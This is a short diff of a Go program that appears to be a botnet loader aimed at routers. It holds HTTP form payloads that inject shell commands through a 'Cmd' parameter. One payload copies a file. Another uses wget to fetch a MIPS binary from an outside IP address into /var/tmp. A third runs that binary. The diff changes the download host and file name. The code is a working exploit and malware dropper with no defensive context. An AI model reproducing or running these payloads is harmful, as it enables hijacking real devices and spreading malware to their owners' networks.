@@ -12,7 +12,7 @@ import (
 "crypto/tls"
 )
 var payload []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=cp+%2Fetc%2Finit.norm+%2Fvar%2Ftmp%2Fresp&CmdAck=")
-var payload2 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F209.141.46.241%2FMIPS+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
+var payload2 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=wget+http%3A%2F%2F2.56.212.215%2F1isequal9.mips+-O+%2Fvar%2Ftmp%2Fresp&CmdAck=")
 var payload3 []byte = []byte("IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fvar%2Ftmp%2Fresp+ztev2&CmdAck=")
  
 var wg sync.WaitGroup  
